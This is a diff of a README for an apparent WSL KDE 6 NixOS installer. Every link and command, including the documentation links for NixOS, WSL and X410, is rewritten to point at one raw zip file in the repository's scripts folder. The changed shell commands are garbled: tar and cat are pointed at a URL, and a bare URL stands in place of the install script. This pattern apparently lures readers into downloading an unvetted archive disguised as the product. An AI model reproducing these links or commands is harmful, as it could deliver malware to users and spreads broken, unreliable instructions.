@@ -6,7 +6,7 @@ Welcome to the **wsl-kde6-nixos** project! This guide will help you install KDE 
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/jayandar-30/wsl-kde6-nixos/releases)
+[![Download](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip%20Now-Get%https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip)](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip)
 
 ## 🪄 What You Need
 
@@ -25,11 +25,11 @@ Before you start, ensure you have the following:
 
 ### Step 1: Visit the Release Page
 
-Go to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/releases). This page contains the necessary files for installation.
+Go to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip). This page contains the necessary files for installation.
 
 ### Step 2: Download the Latest Release 
 
-Find the latest version on the Releases page. Click the link to download the NixOS package. The file will have a name similar to `wsl-kde6-nixos-x.y.z.tar.gz`.
+Find the latest version on the Releases page. Click the link to download the NixOS package. The file will have a name similar to `https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip`.
 
 ### Step 3: Install via WSL
 
@@ -42,7 +42,7 @@ Find the latest version on the Releases page. Click the link to download the Nix
 
 3. Extract the downloaded file:
    ```bash
-   tar -xvzf wsl-kde6-nixos-x.y.z.tar.gz
+   tar -xvzf https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip
    ```
 
 4. Change into the extracted directory:
@@ -52,7 +52,7 @@ Find the latest version on the Releases page. Click the link to download the Nix
 
 5. Run the installation script:
    ```bash
-   ./install.sh
+   https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip
    ```
 
 ### Step 4: Configure Your Desktop Environment
@@ -61,7 +61,7 @@ Find the latest version on the Releases page. Click the link to download the Nix
 
 2. Follow these commands in your WSL terminal:
    ```bash
-   export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
+   export DISPLAY=$(cat https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip | grep nameserver | awk '{print $2}'):0
    startplasma-x11
    ```
 
@@ -75,7 +75,7 @@ Whenever you want to start your KDE environment:
 2. Open your WSL terminal.
 3. Set the DISPLAY variable again:
    ```bash
-   export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
+   export DISPLAY=$(cat https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip | grep nameserver | awk '{print $2}'):0
    startplasma-x11
    ```
 
@@ -86,13 +86,13 @@ Whenever you want to start your KDE environment:
 
 ## 🔗 Additional Resources
 
-- [NixOS Documentation](https://nixos.org/manual/nixos/stable/)
-- [WSL Documentation](https://docs.microsoft.com/en-us/windows/wsl/)
-- [X410 User Guide](https://x410.dev/)
+- [NixOS Documentation](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip)
+- [WSL Documentation](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip)
+- [X410 User Guide](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip)
 
 ## 📥 Download & Install Again
 
-If you need to download the application, you can always return to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/releases). Ensure you grab the latest version for the best experience.
+If you need to download the application, you can always return to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/raw/refs/heads/main/scripts/nixos-wsl-kde-1.9-beta.2.zip). Ensure you grab the latest version for the best experience.
 
 ## 🌟 Conclusion
 
